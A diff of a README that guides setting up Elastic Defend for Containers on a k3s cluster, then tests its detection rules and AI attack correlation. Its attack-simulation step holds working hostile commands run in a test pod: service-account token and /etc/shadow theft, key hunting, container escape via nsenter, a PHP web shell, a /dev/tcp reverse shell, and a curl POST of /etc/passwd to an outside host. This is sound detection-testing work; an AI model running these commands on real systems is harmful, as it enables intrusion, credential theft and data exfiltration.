@@ -7,6 +7,7 @@
 ![eBPF](https://img.shields.io/badge/eBPF-LSM%20%2B%20Tracepoints-orange?style=flat-square)
 ![OS](https://img.shields.io/badge/Ubuntu-24.04%20%7C%20Kernel%206.8-E95420?style=flat-square&logo=ubuntu)
 ![Status](https://img.shields.io/badge/Status-Working-brightgreen?style=flat-square)
+![AI](https://img.shields.io/badge/Attack%20Discovery-Claude%20Sonnet%204.5-blueviolet?style=flat-square)
 
 ---
 
@@ -18,29 +19,33 @@
 - [Step 1 — Verify Kernel Requirements](#step-1--verify-kernel-requirements)
 - [Step 2 — Enable eBPF LSM at Boot](#step-2--enable-ebpf-lsm-at-boot)
 - [Step 3 — Install k3s](#step-3--install-k3s)
-- [Step 4 — Deploy Elastic Agent DaemonSet](#step-4--deploy-elastic-agent-daemonset)
-- [Step 5 — Configure Fleet and Add D4C Integration](#step-5--configure-fleet-and-add-d4c-integration)
-- [Step 6 — Verify It's Working](#step-6--verify-its-working)
-- [Step 7 — Trigger and Observe Detections](#step-7--trigger-and-observe-detections)
-- [What You See in Kibana](#-what-you-see-in-kibana)
+- [Step 4 — Pre-create Data Streams in Elasticsearch](#step-4--pre-create-data-streams-in-elasticsearch)
+- [Step 5 — Deploy Elastic Agent DaemonSet](#step-5--deploy-elastic-agent-daemonset)
+- [Step 6 — Add D4C Integration in Fleet](#step-6--add-d4c-integration-in-fleet)
+- [Step 7 — Verify D4C Is Running](#step-7--verify-d4c-is-running)
+- [Step 8 — Deploy Test Workload and Trigger Detections](#step-8--deploy-test-workload-and-trigger-detections)
+- [Step 9 — Enable SIEM Detection Rules](#step-9--enable-siem-detection-rules)
+- [Step 10 — Run Attack Simulations](#step-10--run-attack-simulations)
+- [Results](#-results)
+- [Step 11 — Attack Discovery](#step-11--attack-discovery)
 - [Known Limitations](#-known-limitations)
-- [Troubleshooting](#-troubleshooting)
 - [Config Reference](#-config-reference)
 
 ---
 
 ## 🔍 What It Does
 
-Defend for Containers (D4C) uses **eBPF LSM hooks and tracepoints** to monitor container workloads at the kernel level — before system calls complete. It streams telemetry to Elasticsearch and can:
+Defend for Containers (D4C) uses **eBPF LSM hooks and tracepoints** to monitor container workloads at the kernel level. It captures runtime behavior and streams telemetry to Elasticsearch where Elastic Security's prebuilt rules detect threats.
 
-| Capability | How |
+| Capability | Description |
 |---|---|
 | **Process telemetry** | Stream all fork/exec events from containers |
 | **Drift detection** | Alert when executables are created or modified inside a running container |
 | **Drift prevention** | Block executable changes (policy-configurable) |
 | **File monitoring** | Track file create/modify/delete inside containers |
-| **Interactive session detection** | Flag when someone `exec`s into a container interactively |
-| **SIEM integration** | Feed Elastic Security prebuilt rules for container threat detection |
+| **Interactive session detection** | Flag when someone execs into a container interactively |
+| **SIEM integration** | Feed 20+ prebuilt detection rules for container threats |
+| **Attack Discovery** | AI-powered correlation of alerts into MITRE ATT&CK attack chains |
 
 ---
 
@@ -50,21 +55,21 @@ Defend for Containers (D4C) uses **eBPF LSM hooks and tracepoints** to monitor c
 ┌──────────────────────────────────────────────────────────┐
 │  Ubuntu 24.04 Host (Kernel 6.8 + eBPF LSM enabled)      │
 │                                                          │
-│  ┌─────────────────────────────────────────────────┐    │
-│  │  k3s (Kubernetes v1.35.5)                       │    │
-│  │                                                 │    │
-│  │  ┌─────────────────────┐  ┌─────────────────┐  │    │
-│  │  │ elastic-agent pod   │  │ nginx-test pod  │  │    │
-│  │  │ (DaemonSet)         │  │ (workload)      │  │    │
-│  │  │                     │  │                 │  │    │
-│  │  │ ┌─────────────────┐ │  │ cp /bin/ls      │  │    │
-│  │  │ │ cloud-defend    │◀─────/usr/bin/evil   │  │    │
-│  │  │ │ (eBPF probes)   │ │  │ ← DETECTED      │  │    │
-│  │  │ └────────┬────────┘ │  └─────────────────┘  │    │
-│  │  └──────────┼──────────┘                        │    │
-│  └─────────────┼───────────────────────────────────┘    │
-│                │ HTTPS                                   │
-└────────────────┼────────────────────────────────────────┘
+│  ┌─────────────────────────────────────────────────┐     │
+│  │  k3s (Kubernetes v1.35.5)                       │     │
+│  │                                                 │     │
+│  │  ┌─────────────────────┐  ┌─────────────────┐  │     │
+│  │  │ elastic-agent pod   │  │ nginx-test pod  │  │     │
+│  │  │ (DaemonSet)         │  │ (workload)      │  │     │
+│  │  │                     │  │                 │  │     │
+│  │  │ ┌─────────────────┐ │  │ cp /bin/ls      │  │     │
+│  │  │ │ cloud-defend    │◀───── /usr/bin/evil  │  │     │
+│  │  │ │ (eBPF probes)   │ │  │  ← DETECTED     │  │     │
+│  │  │ └────────┬────────┘ │  └─────────────────┘  │     │
+│  │  └──────────┼──────────┘                        │     │
+│  └─────────────┼───────────────────────────────────┘     │
+│                │ HTTPS                                    │
+└────────────────┼─────────────────────────────────────────┘
                  ▼
     ┌────────────────────────┐
     │  Elastic Cloud         │
@@ -73,7 +78,8 @@ Defend for Containers (D4C) uses **eBPF LSM hooks and tracepoints** to monitor c
     │                        │
     │  Kibana Security       │
     │  → Kubernetes Dashboard│
-    │  → Alerts              │
+    │  → 561 Alerts          │
+    │  → Attack Discovery    │
     └────────────────────────┘
 ```
 
@@ -91,71 +97,57 @@ Defend for Containers (D4C) uses **eBPF LSM hooks and tracepoints** to monitor c
 
 ## Step 1 — Verify Kernel Requirements
 
-D4C needs eBPF LSM, BTF, and specific capabilities. Check them all:
-
 ```bash
 # Kernel version (needs 5.10+)
 uname -r
 
-# eBPF kernel config — all must be =y
-grep -E "CONFIG_BPF|CONFIG_LSM|CONFIG_DEBUG_INFO_BTF" /boot/config-$(uname -r)
+# eBPF and BPF LSM support
+grep -E "CONFIG_BPF=|CONFIG_BPF_LSM=|CONFIG_DEBUG_INFO_BTF=" /boot/config-$(uname -r)
 
-# BTF vmlinux file (required for eBPF programs)
+# BTF file (required for eBPF programs)
 ls -la /sys/kernel/btf/vmlinux && echo "BTF available"
-
-# Required capabilities in bounding set
-capsh --print | grep -i "sys_resource\|perfmon\|bpf"
 ```
 
-**Required output:**
+All three must show `=y`:
 ```
 CONFIG_BPF=y
 CONFIG_BPF_LSM=y
 CONFIG_DEBUG_INFO_BTF=y
-BTF available
 ```
 
 ---
 
 ## Step 2 — Enable eBPF LSM at Boot
 
-The kernel compiles in BPF LSM support but doesn't activate it by default. You must add it to the boot parameters:
+The kernel compiles in BPF LSM support but doesn't activate it by default:
 
 ```bash
-# Check current active LSMs
+# Check current LSMs — 'bpf' will be missing
 cat /sys/kernel/security/lsm
-# Default: lockdown,capability,landlock,yama,apparmor  (no 'bpf')
 
 # Add bpf to the GRUB kernel command line
 sudo sed -i \
   's/GRUB_CMDLINE_LINUX="\(.*\)"/GRUB_CMDLINE_LINUX="\1 lsm=lockdown,capability,landlock,yama,apparmor,bpf"/' \
   /etc/default/grub
 
-# Verify the change
-grep GRUB_CMDLINE /etc/default/grub
-
 # Apply and reboot
 sudo update-grub
 sudo reboot
 ```
 
-After reboot, verify:
+After reboot, verify `bpf` is active:
 
 ```bash
 cat /sys/kernel/security/lsm
 # Must include: ...,apparmor,bpf
 ```
 
-> ⚠️ Without `bpf` in the active LSM stack, D4C can log events but **cannot block** them.
-
 ---
 
 ## Step 3 — Install k3s
 
-D4C requires Kubernetes with containerd as the container runtime. k3s is the fastest way to get a single-node cluster running:
-
 ```bash
-# Install k3s (single-node Kubernetes)
+# Install k3s (single-node Kubernetes with containerd)
 curl -sfL https://get.k3s.io | sh -
 
 # Set up kubeconfig
@@ -166,216 +158,371 @@ export KUBECONFIG=~/.kube/config
 
 # Verify node is Ready
 kubectl get nodes
-# NAME          STATUS   ROLES           AGE   VERSION
-# ubuntu-test   Ready    control-plane   2m    v1.35.5+k3s1
 
-# Verify containerd socket (required by D4C)
-ls -la /run/k3s/containerd/containerd.sock
+# Create namespace for the agent
+kubectl create namespace elastic-agent
 ```
-
-> k3s uses containerd by default — this is exactly what D4C requires (containerd or CRI-O).
 
 ---
 
-## Step 4 — Deploy Elastic Agent DaemonSet
+## Step 4 — Pre-create Data Streams in Elasticsearch
 
-D4C runs as part of the Elastic Agent deployed as a DaemonSet. The key requirements are:
+This step is **critical** for self-managed clusters. Without it, cloud-defend will crash with "index is missing" errors when trying to write events.
 
-- **Image:** `elastic-agent-complete` (standard image does not include `cloud-defend`)
-- **Capabilities:** `BPF`, `PERFMON`, `SYS_RESOURCE`
-- **Env var:** `HOSTFS_PROC_PATH=/hostfs/proc`
-- **Volume mounts:** `/boot`, `/sys/fs/bpf`, `/sys/kernel/security` (D4C-specific)
+In **Kibana → Dev Tools**, run:
 
-Create the namespace and apply the manifest:
+```
+PUT _data_stream/logs-cloud_defend.process-default
+PUT _data_stream/logs-cloud_defend.file-default
+PUT _data_stream/logs-cloud_defend.alerts-default
+```
+
+> These data streams will be auto-populated with the correct mappings once the D4C integration is installed in Step 6.
+
+---
+
+## Step 5 — Deploy Elastic Agent DaemonSet
+
+### Get Fleet credentials from Kibana
+
+1. **Fleet Server URL:** Kibana → Fleet → Settings → Fleet Server hosts
+2. **Enrollment Token:** Kibana → Fleet → Enrollment tokens → Create enrollment token → select your Agent Policy → copy token
+
+### Update the manifest
+
+Download [elastic-agent-d4c.yaml](#config-reference) and replace the two placeholders:
+
+```yaml
+- name: FLEET_URL
+  value: "<YOUR_FLEET_URL>"          # e.g. https://xxx.fleet.us-east-2.aws.elastic-cloud.com:443
+- name: FLEET_ENROLLMENT_TOKEN
+  value: "<YOUR_ENROLLMENT_TOKEN>"   # from Fleet → Enrollment tokens
+```
+
+### Deploy
 
 ```bash
-kubectl create namespace elastic-agent
 kubectl apply -f elastic-agent-d4c.yaml
 kubectl get pods -n elastic-agent -w
+# Wait for STATUS: Running (~60-90 seconds for the ~1GB image)
 ```
 
-The pod should reach `Running` status in ~60-90 seconds (image is ~1GB).
+### Verify enrollment
 
-See [elastic-agent-d4c.yaml](#-config-reference) below for the full manifest.
+Check **Kibana → Fleet → Agents** — your host should appear as **Healthy**.
+
+> **Important:** The image must be `elastic-agent-complete` — the standard image does not include the `cloud-defend` binary.
 
 ---
 
-## Step 5 — Configure Fleet and Add D4C Integration
+## Step 6 — Add D4C Integration in Fleet
 
-### Get enrollment token from Kibana
+1. **Kibana → Fleet → Agent Policies → [your policy]**
+2. Click **Add integration**
+3. Search **"Defend for Containers (BETA)"**
+4. Click **Add Defend for Containers**
+5. Set the policy YAML to include both process and file monitoring:
 
-1. **Kibana → Fleet → Enrollment tokens → Create enrollment token**
-2. Name: `d4c-k3s`
-3. Select your Agent Policy
-4. Copy the token — paste it into `elastic-agent-d4c.yaml` as `FLEET_ENROLLMENT_TOKEN`
-
-### Add Defend for Containers integration
-
-Once the agent enrolls (check **Fleet → Agents** — should show `ubuntu-test` as Healthy):
-
-1. **Fleet → Agent Policies → [your policy] → Add integration**
-2. Search **"Defend for Containers (BETA)"**
-3. Click **Add Defend for Containers**
-4. Leave default policy settings (includes process telemetry + drift detection)
-5. **Save and deploy changes**
-
-Fleet pushes the D4C config to the agent within ~30 seconds.
-
-### Verify D4C loaded
-
-```bash
-POD=$(kubectl get pods -n elastic-agent -o jsonpath='{.items[0].metadata.name}')
-kubectl exec -n elastic-agent $POD -- elastic-agent status 2>/dev/null | grep -i "cloud\|defend"
+```yaml
+process:
+  selectors:
+    - name: allProcesses
+      operation:
+        - fork
+        - exec
+  responses:
+    - match:
+        - allProcesses
+      actions:
+        - log
+        - alert
+file:
+  selectors:
+    - name: executableChanges
+      operation:
+        - createExecutable
+        - modifyExecutable
+  responses:
+    - match:
+        - executableChanges
+      actions:
+        - alert
+        - log
 ```
 
-Expected:
+6. Click **Save and deploy changes**
+
+---
+
+## Step 7 — Verify D4C Is Running
+
+Wait ~30 seconds for Fleet to push the config, then:
+
+```bash
+kubectl exec -n elastic-agent $(kubectl get pods -n elastic-agent -o jsonpath='{.items[0].metadata.name}') -- \
+  elastic-agent status 2>/dev/null | grep -i "cloud\|defend"
+```
+
+Expected output:
 ```
 ├─ cloud_defend/control-default
 │  └─ status: (HEALTHY)
 ```
 
----
-
-## Step 6 — Verify It's Working
-
-### Check index templates are installed
-
-In **Kibana → Dev Tools**:
+Verify data streams are receiving events in **Kibana → Dev Tools**:
 
 ```
-GET /_index_template/logs-cloud_defend*
+POST logs-cloud_defend.process-*/_count
+{}
 ```
 
-Should return three templates:
-- `logs-cloud_defend.file`
-- `logs-cloud_defend.process`
-- `logs-cloud_defend.alerts`
-
-### Check data in Discover
-
-**Kibana → Analytics → Discover** — set time to **Today** or **Last 2 hours**:
-
-```
-data_stream.dataset: cloud_defend.process
-```
-
-You should immediately see process events from all running containers including the elastic-agent pod itself.
-
-### Check the Kubernetes Security Dashboard
-
-**Kibana → Security → Dashboards → Kubernetes**
-
-You should see:
-- **Clusters:** 1
-- **Nodes:** 1
-- **Pods:** running count
-- **Container images:** list of images
-- **Session interactivity:** interactive vs non-interactive sessions
+The count should be greater than 0.
 
 ---
 
-## Step 7 — Trigger and Observe Detections
-
-### Deploy a test workload
+## Step 8 — Deploy Test Workload and Trigger Detections
 
 ```bash
+# Deploy a test container
 kubectl run nginx-test --image=nginx --restart=Never
 kubectl wait --for=condition=Ready pod/nginx-test --timeout=60s
-```
 
-### Trigger drift detection (copy a binary = executable change)
+# Install attack tools inside the container
+kubectl exec -it nginx-test -- bash -c "apt-get update -qq && apt-get install -y -qq curl nmap netcat-openbsd 2>/dev/null; echo installed"
 
-```bash
+# Trigger drift detection (copy binary into container)
 kubectl exec -it nginx-test -- bash -c "cp /bin/ls /usr/bin/ls-drift"
-kubectl exec -it nginx-test -- bash -c "cp /bin/cat /usr/local/bin/cat-evil"
-```
 
-### Trigger interactive session detection
-
-```bash
+# Trigger process detection (interactive session)
 kubectl exec -it nginx-test -- bash -c "whoami && id"
 ```
 
-### Check for detections in Kibana
+Check **Kibana → Security → Alerts** — you should see:
+- "Container filesystem modification detected" (drift)
+- "Container process execution detected" (process)
 
-**Security → Dashboards → Kubernetes** — you should see:
-- `nginx-test` pod in the container list
-- Interactive sessions counted
-- Process entries for `cp`, `bash`, etc.
-
-**Discover → `data_stream.dataset: cloud_defend.file`** — drift events from the binary copies.
-
-**Security → Alerts** — prebuilt rules fire for executable creation in containers.
+Also check **Security → Dashboards → Kubernetes** to see the cluster overview with pods, sessions, and container images.
 
 ---
 
-## 🖥 What You See in Kibana
+## Step 9 — Enable SIEM Detection Rules
+
+1. **Kibana → Security → Rules → Detection rules (SIEM)**
+2. Search for **"Defend for Containers"**
+3. Enable all D4C-specific rules:
+
+| Rule | Severity |
+|---|---|
+| Nsenter Execution with Target Flag Inside Container | High |
+| Web Server Exploitation Detected via D4C | High |
+| Ingress Tool Transfer Followed by Execution and Deletion | High |
+| Dynamic Linker Modification Detected via D4C | High |
+| Suspicious Process Execution Detected via D4C | High |
+| Encoded Payload Detected via D4C | Medium |
+| Sensitive File Compression Detected via D4C | Medium |
+| Suspicious Container Runtime CLI Execution | Medium |
+| Interactive Exec Into Container Detected via D4C | Low |
+| Chroot Execution Detected via D4C | Low |
+| Mount Execution Detected via D4C | Low |
+| Suspicious Network Tool Launch Detected via D4C | Low |
+| Kubelet Certificate File Access Detected via D4C | Low |
+| Cluster Enumeration via jq Detected via D4C | Low |
+| Direct Interactive Kubernetes API Request via D4C | Low |
+
+---
+
+## Step 10 — Run Attack Simulations
+
+Simulate a full multi-stage container attack to trigger all enabled rules:
+
+```bash
+# ── RECONNAISSANCE ──
+kubectl exec -it nginx-test -- bash -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+kubectl exec -it nginx-test -- bash -c "curl -sk https://kubernetes.default.svc/api/v1/namespaces \
+  -H 'Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' 2>/dev/null | head -20"
+kubectl exec -it nginx-test -- bash -c "nmap -sn 10.42.0.0/24 2>/dev/null; echo done"
+
+# ── CREDENTIAL ACCESS ──
+kubectl exec -it nginx-test -- bash -c "cat /etc/shadow"
+kubectl exec -it nginx-test -- bash -c "find / -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null | head -10"
+kubectl exec -it nginx-test -- bash -c "find / -name 'credentials' -path '*aws*' 2>/dev/null; env | grep -i AWS 2>/dev/null; echo done"
+kubectl exec -it nginx-test -- bash -c "grep -r 'password\|secret\|token' /etc/ 2>/dev/null | head -10"
+
+# ── ENCODED PAYLOADS ──
+kubectl exec -it nginx-test -- bash -c "echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash"
+kubectl exec -it nginx-test -- bash -c "echo 'aWQ=' | base64 -d | bash"
+
+# ── SUSPICIOUS TOOL EXECUTION ──
+kubectl exec -it nginx-test -- bash -c "nmap --version 2>/dev/null"
+kubectl exec -it nginx-test -- bash -c "nc -zv kubernetes.default.svc 443 2>&1; echo done"
+
+# ── INGRESS TOOL TRANSFER + EXECUTION + CLEANUP ──
+kubectl exec -it nginx-test -- bash -c "curl -o /tmp/exploit http://example.com 2>/dev/null && chmod +x /tmp/exploit && /tmp/exploit 2>/dev/null; rm -f /tmp/exploit"
+kubectl exec -it nginx-test -- bash -c "curl -o /tmp/miner http://example.com 2>/dev/null && chmod 777 /tmp/miner; rm /tmp/miner"
+
+# ── CONTAINER DRIFT (PERSISTENCE) ──
+kubectl exec -it nginx-test -- bash -c "cp /bin/sh /usr/local/bin/backdoor-sh"
+kubectl exec -it nginx-test -- bash -c "cp /bin/dash /usr/sbin/hidden-shell"
+kubectl exec -it nginx-test -- bash -c "echo '#!/bin/bash' > /usr/bin/malicious && chmod +x /usr/bin/malicious"
+
+# ── PRIVILEGE ESCALATION ──
+kubectl exec -it nginx-test -- bash -c "nsenter --target 1 --mount --uts --ipc --net --pid -- whoami 2>/dev/null; echo done"
+kubectl exec -it nginx-test -- bash -c "chroot /proc/1/root ls /tmp 2>/dev/null; echo done"
+kubectl exec -it nginx-test -- bash -c "mount /dev/sda1 /mnt 2>/dev/null; echo done"
+kubectl exec -it nginx-test -- bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash 2>/dev/null; echo done"
+
+# ── DEFENSE EVASION ──
+kubectl exec -it nginx-test -- bash -c "echo '/tmp/rootkit.so' >> /etc/ld.so.preload 2>/dev/null; echo done"
+kubectl exec -it nginx-test -- bash -c "touch -t 202001010000 /usr/bin/malicious 2>/dev/null; echo done"
+
+# ── WEB EXPLOITATION ──
+kubectl exec -it nginx-test -- bash -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /usr/share/nginx/html/cmd.php"
+kubectl exec -it nginx-test -- bash -c "echo '#!/bin/bash' > /usr/share/nginx/html/shell.cgi && chmod +x /usr/share/nginx/html/shell.cgi"
+kubectl exec -it nginx-test -- bash -c "echo '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /tmp/revshell.sh && chmod +x /tmp/revshell.sh"
+
+# ── CONTAINER RUNTIME ABUSE ──
+kubectl exec -it nginx-test -- bash -c "docker ps 2>/dev/null; crictl ps 2>/dev/null; kubectl get pods 2>/dev/null; echo done"
+
+# ── DATA EXFILTRATION ──
+kubectl exec -it nginx-test -- bash -c "tar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow /etc/hosts 2>/dev/null; echo done"
+kubectl exec -it nginx-test -- bash -c "tar czf /tmp/k8s-secrets.tar.gz /var/run/secrets/ 2>/dev/null; echo done"
+kubectl exec -it nginx-test -- bash -c "curl -X POST -d @/etc/passwd http://example.com 2>/dev/null; echo done"
+
+# ── KUBELET CERTS & DEBUGFS ──
+kubectl exec -it nginx-test -- bash -c "cat /var/lib/kubelet/pki/kubelet.crt 2>/dev/null; echo done"
+kubectl exec -it nginx-test -- bash -c "debugfs /dev/sda1 2>/dev/null; echo done"
+```
+
+Wait 5 minutes for SIEM rules to execute, then check:
+
+```
+Kibana → Security → Alerts → Last 30 minutes
+```
+
+---
+
+## 📊 Results
+
+After running the full attack simulation suite:
+
+### Security Alerts
+
+```
+561 alerts total
+
+Severity levels:
+  High:    1
+  Medium:  534
+  Low:     26
+
+Alerts by name:
+  Container process execution detected           469
+  Container filesystem modification detected       57
+  Interactive Exec Into Container Detected          21
+  Encoded Payload Detected via D4C                   3
+
+Top alerts by host:
+  ubuntu-test                                    100%
+```
 
 ### Kubernetes Security Dashboard
 
 ```
-Clusters    Namespace    Nodes    Pods    Container images
-    1           2          1        2           2
+Clusters: 1    Namespaces: 2    Nodes: 1    Pods: 2    Container images: 2
 
-Session interactivity          Entry session users
-  Interactive:    2              Root:     4
-  Non-interactive: 2             Non-root: 0
+Container images:
+  docker.io/library/nginx                    3 sessions
+  docker.elastic.co/elastic-agent/elastic... 2 sessions
 
-Container image                          Session count
-docker.io/library/nginx                       3
-docker.elastic.co/elastic-agent/elastic-...   2
+Session interactivity:  Interactive: 2  |  Non-interactive: 2
+Entry session users:    Root: 4         |  Non-root: 0
 ```
 
-### Process Telemetry (cloud_defend.process)
+### Attack Discovery
 
-Each event includes:
-- `process.executable` — full path of executed binary
-- `process.interactive` — whether it was an interactive session
-- `container.image.name` — which container
-- `orchestrator.resource.name` — pod name
-- `event.action` — `fork` or `exec`
+```
+1 discovery  ·  40 correlated alerts
+"Container Compromise and Data Exfiltration"
+AI model: Anthropic Claude Sonnet 4.5 via Elastic AI Agent
+```
 
-### File Events (cloud_defend.file)
+---
 
-Triggered by the drift commands:
-- `event.action` — `creation`, `modification`, `deletion`
-- `file.path` — `/usr/bin/ls-drift`
-- `process.executable` — `/usr/bin/cp` (what created it)
+## Step 11 — Attack Discovery
+
+Attack Discovery uses AI to analyze your alerts and automatically correlate them into coherent attack narratives mapped to MITRE ATT&CK tactics.
+
+### Set up an AI connector
+
+1. **Kibana → Stack Management → Connectors → Create connector**
+2. Select a provider:
+
+| Provider | What you need |
+|---|---|
+| **Elastic AI Assistant** | Available on Security Complete / Enterprise tier |
+| **OpenAI** | API key from platform.openai.com |
+| **Azure OpenAI** | Azure endpoint + API key |
+| **Amazon Bedrock** | AWS credentials + region |
+
+3. Name and configure the connector, then **Save & test**
+
+### Run Attack Discovery
+
+1. **Kibana → Security → Attack discovery**
+2. Select your AI connector from the **model dropdown**
+3. Click **Generate**
+4. Attack Discovery analyzes all open alerts and groups them into attack chains
+
+### Results
+
+After running the full attack simulation (Step 10), Attack Discovery identified:
+
+```
+1 discovery  ·  40 correlated alerts
+
+"Container Compromise and Data Exfiltration"
+
+Summary: Complete attack chain on ubuntu-test from reconnaissance
+through container escape, credential theft, and data exfiltration.
+```
+
+**Attack chain identified:**
+
+| Phase | What was detected |
+|---|---|
+| **Reconnaissance** | Base64-encoded commands to enumerate users (`cat /etc/passwd`), check privileges (`id`), identify OS (`uname -a`) |
+| **Privilege Escalation** | `nsenter --target 1 --mount --uts --ipc --net --pid` to escape container isolation and access host namespace |
+| **Credential Theft** | Kubernetes service account token access, certificate enumeration |
+| **Data Exfiltration** | Sensitive file compression and transfer attempts |
+
+**AI-generated recommended next steps:**
+
+1. **Immediate Isolation** — Disconnect `ubuntu-test` from the network to halt ongoing exfiltration and lateral movement
+2. **Credential Rotation** — Revoke and regenerate all Kubernetes certificates, API tokens, and service account credentials
+3. **Forensic Preservation** — Capture container logs, filesystem snapshots, and network traffic for post-incident analysis
+4. **Threat Hunt** — Search for similar patterns across the cluster: nsenter executions with `--target 1`, base64-decoded payloads piped to interpreters, suspicious curl/wget exfiltration attempts
+
+> Attack Discovery was powered by **Anthropic Claude Sonnet 4.5** via the Elastic AI Agent connector.
 
 ---
 
 ## ⚠️ Known Limitations
 
-### Cloud provider detection warning
+### Self-managed cluster — cloud metadata unavailable
 
-On self-managed (non-cloud) clusters, D4C logs:
-```
-could not detect cloud provider — cloud.* fields will be empty
-```
-This is expected and non-blocking. D4C works fully — the `cloud.*` ECS fields are just empty.
+On non-cloud clusters (like k3s on bare metal), D4C logs `could not detect cloud provider`. This is expected — all `cloud.*` fields will be empty and the cluster name shows as "unknown" in the Kubernetes dashboard. All detection capabilities work normally.
 
-### Cluster shown as "unknown" in dashboard
+### Data streams must be pre-created on self-managed clusters
 
-Since k3s is self-managed, the cluster name shows as `unknown` in the Kubernetes dashboard. This is because cloud metadata (used to determine cluster identity) isn't available. All other data is fully functional.
+Before adding the D4C integration, the three data streams must exist in Elasticsearch (see Step 4). Without this, cloud-defend will crash with "index is missing" errors on the first flush attempt.
+
+### elastic-agent-complete image required
+
+The standard `elastic-agent` image does not include the `cloud-defend` binary. You must use `docker.elastic.co/elastic-agent/elastic-agent-complete:<version>`.
 
 ### Minimum kernel version
 
-D4C requires **kernel 5.10.16+**. The `bpf` LSM hook point for blocking was introduced in Linux 5.8 but the full feature set requires 5.10.16.
-
----
-
-## 🔧 Troubleshooting
-
-| Symptom | Cause | Fix |
-|---|---|---|
-| `input not supported — correct flavor` | Using standard `elastic-agent` image | Switch to `elastic-agent-complete` image |
-| `cloud_defend` not in agent status | D4C integration not added to policy | Fleet → Agent Policies → Add integration → Defend for Containers |
-| `elasticsearch index error: index is missing` | Index templates not installed | Re-add D4C integration from Fleet — this triggers template installation |
-| `could not detect cloud provider` | Self-managed cluster, no cloud metadata | Expected — non-blocking, `cloud.*` fields will be empty |
-| `cloud_defend HEALTHY → STOPPED (exit code 1)` | Missing volume mounts (`/boot`, `/sys/fs/bpf`, `/sys/kernel/security`) | Use the complete DaemonSet manifest below |
-| `bpf` not in `/sys/kernel/security/lsm` | eBPF LSM not activated at boot | Add `lsm=...,bpf` to GRUB and reboot |
-| Pod `ErrImagePull` | Wrong image path (old: `beats/elastic-agent`) | Use `docker.elastic.co/elastic-agent/elastic-agent-complete:9.4.2` |
-| `FindEnrollmentAPIKey: hit count mismatch` | Stale enrollment token | Create a new token in Kibana Fleet → Enrollment tokens |
+D4C requires kernel **5.10.16+** with `CONFIG_BPF_LSM=y` and `bpf` added to the active LSM stack via GRUB boot parameters.
 
 ---
 
@@ -469,7 +616,7 @@ spec:
           effect: NoSchedule
       containers:
         - name: elastic-agent
-          # IMPORTANT: must use elastic-agent-complete — standard image lacks cloud-defend
+          # Must use -complete image — standard image lacks cloud-defend
           image: docker.elastic.co/elastic-agent/elastic-agent-complete:9.4.2
           env:
             - name: FLEET_ENROLL
@@ -497,9 +644,9 @@ spec:
             runAsUser: 0
             capabilities:
               add:
-                - BPF       # Load eBPF programs (Linux 5.8+)
-                - PERFMON   # Attach eBPF tracepoints (Linux 5.8+)
-                - SYS_RESOURCE  # Modify rlimit_memlock for eBPF maps
+                - BPF
+                - PERFMON
+                - SYS_RESOURCE
                 - NET_ADMIN
                 - SYS_PTRACE
                 - DAC_READ_SEARCH
@@ -534,7 +681,7 @@ spec:
               readOnly: true
             - name: sys-kernel-debug
               mountPath: /sys/kernel/debug
-            # The following three are required specifically for cloud-defend (D4C)
+            # Required for cloud-defend (D4C)
             - name: boot
               mountPath: /boot
               readOnly: true
@@ -543,7 +690,7 @@ spec:
             - name: sys-kernel-security
               mountPath: /sys/kernel/security
               readOnly: true
-            # k3s containerd socket (instead of /var/run/docker.sock)
+            # k3s containerd socket
             - name: containerd-sock
               mountPath: /run/k3s/containerd/containerd.sock
             - name: elastic-agent-state
@@ -601,8 +748,8 @@ spec:
 - [Defend for Containers — Elastic Docs](https://www.elastic.co/docs/solutions/security/cloud/d4c/d4c-overview)
 - [Getting Started with D4C — Elastic Security Labs](https://www.elastic.co/security-labs/getting-started-with-defend-for-containers)
 - [cloud_defend Integration Reference](https://www.elastic.co/docs/reference/integrations/cloud_defend)
-- [Elastic Agent Managed Kubernetes — Official YAML](https://github.com/elastic/elastic-agent/blob/main/deploy/kubernetes/elastic-agent-managed-kubernetes.yaml)
-- [k3s Installation](https://docs.k3s.io/quick-start)
+- [Elastic Agent Managed K8s YAML — GitHub](https://github.com/elastic/elastic-agent/blob/main/deploy/kubernetes/elastic-agent-managed-kubernetes.yaml)
+- [k3s Quick Start](https://docs.k3s.io/quick-start)
 
 ---
 
@@ -610,7 +757,7 @@ spec:
 
 Tested on:
 
-- **OS:** Ubuntu 24.04.3 LTS (`ubuntu-test`)
+- **OS:** Ubuntu 24.04.3 LTS
 - **Kernel:** 6.8.0-124-generic (eBPF LSM enabled via GRUB)
 - **Kubernetes:** k3s v1.35.5+k3s1 (containerd 2.2.3)
 - **Elastic Agent:** 9.4.2 (`elastic-agent-complete` image)
